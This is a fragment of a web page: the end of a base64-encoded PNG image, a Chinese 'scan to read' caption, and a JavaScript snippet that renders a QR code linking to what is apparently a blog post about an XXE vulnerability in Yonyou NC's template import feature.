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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 